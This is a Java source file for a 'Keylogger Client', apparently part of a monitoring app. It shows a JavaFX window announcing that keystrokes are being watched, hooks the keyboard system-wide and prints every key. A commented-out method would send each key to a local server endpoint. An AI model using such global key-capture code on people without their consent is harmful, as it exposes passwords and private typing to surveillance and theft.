package com.client.liveowl.KeyLogger;

import com.github.kwhat.jnativehook.NativeHookException;
import javafx.application.Application;
import javafx.scene.Scene;
import javafx.scene.control.Label;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;
//import org.jnativehook.GlobalScreen;
//import org.jnativehook.NativeHookException;
//import org.jnativehook.keyboard.NativeKeyEvent;
//import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLoggerClient extends Application implements NativeKeyListener {

    private static final Logger logger = LoggerFactory.getLogger(KeyLoggerClient.class);
    private static final String SERVER_URL = "http://localhost:8080/api/keylogger";

    public static void main(String[] args) {
        launch(args);
    }

    @Override
    public void start(Stage primaryStage) {
        VBox root = new VBox();
        Label label = new Label("Ứng dụng đang theo dõi phím gõ...");
        root.getChildren().add(label);

        Scene scene = new Scene(root, 300, 200);
        primaryStage.setTitle("Keylogger Client");
        primaryStage.setScene(scene);
        primaryStage.show();

        // Khởi tạo keylogger
        initKeyLogger();
    }

    private void initKeyLogger() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error("Error registering native hook", e);
        }

        GlobalScreen.addNativeKeyListener(this);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println(keyText);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // Không cần xử lý sự kiện thả phím
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println(keyText);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Không cần xử lý sự kiện gõ phím
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println(keyText);
    }

//    private void sendKeyToServer(String keyText) {
//        try {
//            URL url = new URL(SERVER_URL);
//            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//            connection.setRequestMethod("POST");
//            connection.setRequestProperty("Content-Type", "application/json; utf-8");
//            connection.setDoOutput(true);
//
//            String jsonInputString = "{\"key\":\"" + keyText + "\"}";
//
//            try (var os = connection.getOutputStream()) {
//                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
//                os.write(input, 0, input.length);
//            }
//
//            int code = connection.getResponseCode();
//            logger.info("Key sent, server responded with code: " + code);
//
//        } catch (IOException e) {
//            logger.error("Error sending key to server", e);
//        }
//    }
}
